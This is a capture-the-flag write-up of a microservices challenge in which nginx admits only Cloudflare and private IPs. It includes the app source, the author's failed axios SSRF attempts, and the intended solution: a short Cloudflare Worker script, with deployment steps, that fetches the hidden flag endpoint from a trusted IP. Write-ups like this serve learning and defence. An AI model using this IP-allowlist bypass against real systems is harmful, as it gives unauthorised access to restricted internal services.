![image](https://github.com/user-attachments/assets/1546a33e-4c14-4ed9-9f98-37e7ecc394d0)

## How the app works:
Web Server (the one we can access), quotes-api (internal), flag-api (internal & hidden)

Routes:	What Happens	Note
**/api/quotes** - server requests quotes-api/quotes	(Nothing we can control)
**/api/quotes/raw** - Server requests quotes-api/quotes/raw (Only place I can test SSRF)

## Working Exploit:

```
worker_processes  auto;

events {
    worker_connections  1024;
}

http {
    include       mime.types;
    default_type  application/octet-stream;

    access_log  /var/log/nginx/access.log;
    error_log   /var/log/nginx/error.log warn;

    sendfile        on;
    keepalive_timeout  65;

    server {
        listen 80;

        location / {
            # Private IPs
            allow 127.0.0.1;
            allow ::1;
            allow 172.18.0.0/16;
            allow 10.0.0.0/8;
            allow 172.16.0.0/12;
            allow 192.168.0.0/16;


            # Cloudflare IPs
            allow 103.21.244.0/22;
            allow 103.22.200.0/22;
            allow 103.31.4.0/22;
            allow 104.16.0.0/13;
            allow 104.24.0.0/14;
            allow 108.162.192.0/18;
            allow 131.0.72.0/22;
            allow 141.101.64.0/18;
            allow 162.158.0.0/15;
            allow 172.64.0.0/13;
            allow 173.245.48.0/20;
            allow 188.114.96.0/20;
            allow 190.93.240.0/20;
            allow 197.234.240.0/22;
            allow 198.41.128.0/17;

            deny all;

            proxy_pass http://localhost:5555;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_http_version 1.1;
        }
    }
}
```

Since nginx only allowed Cloudflare IP ranges, the intended solution was to abuse Cloudflare Worker to make the request for me. Cloudflare Worker runs on Cloudflare’s server so the request came from a trusted IP.

```
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Your SSRF Target
  const url = 'http://microservices-challenge.eqctf.com:5555/flag' 

  const res = await fetch(url)
  const body = await res.text()

  return new Response(body)
}
```
Steps:
1.	Go to Cloudflare and Create Worker
2.	Paste the code above
3.	Deploy
4.	Visit your Worker URL:
https://your-worker-name.username.workers.dev

Boom! the flag shows up. Deploy. Visit the Worker URL. And... boom. There’s the flag. 

![image](https://github.com/user-attachments/assets/3ed5dafa-8421-4695-bd30-1c6c17915ac7)

## My Process:

![image](https://github.com/user-attachments/assets/7b4c4db3-903f-4c7c-bd11-178c7d20e0d8) ![image](https://github.com/user-attachments/assets/3f8be58b-0d84-4f15-826d-115078904ef4)

When I saw the code using axios.get(), I knew it was making HTTP requests from the server side.

```
const express = require('express')
const axios = require('axios')
const app = express()

const QUOTES_API_URL = "quotes-api"
const FLAG_API_URL = "flag-api"

app.get('/api/quotes', async (req, res) => {
  try {
    const response = await axios.get(`http://${QUOTES_API_URL}/quotes`)
    res.json(response.data)
  } catch {
    res.status(500).send('internal error')
  }
})

app.get('/api/quotes/raw', async (req, res) => {
  try {
    const response = await axios.get(`http://${QUOTES_API_URL}/quotes/raw`)
    res.type('text').send(response.data)
  } catch {
    res.status(500).send('internal error')
  }
})

// we had to remove this endpoint to prevent the flag from being leaked
// app.get('/api/flag', async (req, res) => {
//     try {
//       const response = await axios.get(`http://${FLAG_API_URL}/flag`)
//       res.type('text').send(response.data)
//     } catch {
//       res.status(500).send('internal error')
//     }
// })

app.listen(7777)
```
I searched for SSRF with axios and found:
https://security.snyk.io/package/npm/axios
https://github.com/axios/axios/issues/6463

From there I learned about some common techniques like double request injection, header injection, and CRLF injection. So, I started testing. I changed methods, added random headers, modified Host header to flag-api, and played around with the request structure. After doing that for quite a while, I got tired of sending requests manually. I wrote a simple Python script just to help me test faster. Still nothing worked. At this point I had already spent almost 12 hours on this challenge. Testing, trying, and just staring at Burp and my terminal. It was really tiring and kind of broke me down because I felt like whatever I tried was not enough. After the CTF ended, I found out the intended solution was to use Cloudflare Worker. I tried it, and it worked instantly.


